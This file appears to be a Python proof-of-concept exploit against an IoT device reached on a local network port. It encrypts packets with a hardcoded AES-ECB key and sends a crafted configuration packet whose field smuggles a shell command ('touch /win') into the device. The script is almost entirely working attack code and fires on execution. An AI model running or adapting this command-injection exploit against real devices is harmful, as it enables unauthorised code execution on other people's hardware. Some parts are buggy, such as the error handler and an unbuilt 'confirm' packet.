#!/usr/bin/python
import codecs
import re
from socket import AF_INET, SOCK_STREAM, socket

from Cryptodome.Cipher import AES

KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo".encode("utf-8")
MAC_ADDR = "28:d9:8a:8d:f4:bb"
IP_ADDR = "192.168.145.253"
SOCK_TIMEOUT = 1
RETRY = 0
RPORT = 37092

def stdout(t, m) -> None:
    if t == "+":
        print("\x1b[32;1m[+]\x1b[0m\t" + m + "\n")
    elif t == "-":
        print("\x1b[31;1m[-]\x1b[0m\t" + m + "\n")
    elif t == "*":
        print("\x1b[34;1m[*]\x1b[0m\t" + m + "\n")
    elif t == "!":
        print("\x1b[33;1m[!]\x1b[0m\t" + m + "\n")


def sanitize_byte(byte):
    if byte == "0x0":
        return "0"
    if ord(byte) < 30 or ord(byte) > 128:
        return "."
    if ord(byte) > 30 or ord(byte) < 128:
        return byte
    return None


def create_dump(data):
    dump, by, hx, _temp = "", [], [], ""
    unprint = list(data)
    for el in unprint:
        hx.append(el.encode("utf-8").hex())
        by.append(sanitize_byte(el))
    i = 0
    while i < len(hx):
        if (len(hx) - i) >= 16:
            dump += " ".join(hx[i : i + 16])
            dump += "         "
            dump += " ".join(by[i : i + 16])
            dump += "\n"
            i = i + 16
        else:
            dump += " ".join(hx[i : (len(hx) - 1)])
            pad = len(" ".join(hx[i : (len(hx) - 1)]))
            dump += " " * (56 - pad)
            dump += " ".join(by[i : (len(hx) - 1)])
            dump += "\n"
            i = i + len(hx)
    return dump


class CryptoSock:
    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket(AF_INET, SOCK_STREAM)
            self.sock.settimeout(SOCK_TIMEOUT)
        else:
            self.sock = sock
        self.key = AES.new(KEY, AES.MODE_ECB)

    def connect(self, host, port) -> None:
        self.sock.connect((host, port))

    def txnc(self, msg, rhost, rport) -> None:
        self.sock.sendto(self.key.encrypt(msg.encode("utf-8")), (rhost, rport))

    def tx(self, msg) -> None:
        self.sock.send(self.key.encrypt(msg.encode("utf-8")))

    def rx(self):
        try:
            msg = self.sock.recv(1024)
            if len(msg) > 1:
                return self.key.decrypt(msg)
        except TimeoutError:
            stdout("-", "timed out")
            return 1
        except Exception as e:
            stdout(e)


def get_packet(
    t,
    e=None,
    mac=MAC_ADDR,
    name="lan_phone",
    password="nopassword",
    on_time=None,
    off_time=None,
):
    _d, c = "%", ""
    if t == "inject":
        c = "phone%pina';touch /win; echo 'lol%pineapplekey%nopassword%name%GMT-0600"
    while len(c) % 16 != 0:
        c = c + "\x00"
    return c


def txrx(ip, port, t, rt=1):
    sock = CryptoSock()
    sock.connect(ip, port)
    sock.tx(t)
    if rt == 1:
        r = sock.rx()
        if r is not None:
            return r
        return None
    return 0


def send_and_confirm(op) -> None:
    m = get_packet(op)
    i = 0
    j = 0
    max_retry = RETRY
    while i == 0:
        if j > max_retry:
            break
        if j > 0:
            stdout("!", "retrying " + str(j) + "/" + str(max_retry))
        stdout("*", "tx\n" + create_dump(m))
        ret = txrx(IP_ADDR, RPORT, m)
        if ret != 1:
            stdout("*", "rx\n" + create_dump(ret))
            p = re.compile(r".*?(\d\d\d\d\d).*?")
            q = p.match(ret)
            if q is not None:
                m = get_packet("confirm", q.group(1))
                stdout("*", "\n" + create_dump(m))
                get = txrx(IP_ADDR, RPORT, m)
                stdout("*", "\n" + create_dump(get))
                i = 1
            else:
                i = 1
        else:
            j = j + 1


def inject() -> None:
    send_and_confirm("inject")


inject()
